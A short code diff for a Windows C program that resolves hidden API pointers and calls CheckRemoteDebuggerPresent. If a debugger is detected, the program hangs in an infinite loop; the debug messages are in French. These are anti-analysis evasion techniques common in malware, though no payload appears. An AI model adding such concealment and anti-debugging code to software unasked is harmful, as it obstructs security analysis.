@@ -17,32 +17,39 @@ int main(void) {
   // Allows us to print non-ASCII characters for debug
   SetConsoleOutputCP(CP_UTF8);
 #endif
+
+  // Init
+  hidden_apis apis = {0};
+  resolve_apis(&apis); 
+
   // Check if a debugger is attached to the process
   BOOL isDebuggerPresent = FALSE;
   HANDLE hProcess = GetCurrentProcess();
 
-  PCheckRemoteDebuggerPresent func;
-  hidden_apis apis[] = {func};
-  // resolve_apis(apis); type problem
-
-  if (func(hProcess, &isDebuggerPresent)) {
-    printf("Nice call\n");
-    if (isDebuggerPresent) {
+  if (apis.funcCheckRemoteDebuggerPresent) {
+    if (apis.funcCheckRemoteDebuggerPresent(hProcess, &isDebuggerPresent)) {
+      printf("Nice call\n");
+      if (isDebuggerPresent) {
 #ifdef DEBUG
-      printf("Un débogueur est détecté sur ce processus.\n");
+        printf("Un débogueur est détecté sur ce processus.\n");
 #endif
-      while (1);
-    } else {
+        while (1);
+      } 
+      else {
 #ifdef DEBUG
-      printf("Aucun débogueur n'est détecté sur ce processus.\n");
+        printf("Aucun débogueur n'est détecté sur ce processus.\n");
+#endif
+      }
+    } 
+    else {
+#ifdef DEBUG
+      printf("Erreur lors de l'appel à CheckRemoteDebuggerPresent. Code d'erreur : %lu\n", GetLastError());
 #endif
     }
-  } else {
+  } 
+  else {
 #ifdef DEBUG
-    printf(
-        "Erreur lors de l'appel à CheckRemoteDebuggerPresent. Code d'erreur : "
-        "%lu\n",
-        GetLastError());
+    printf("Erreur: CheckRemoteDebuggerPresent n'a pas été résolu correctement.\n");
 #endif
   }
 
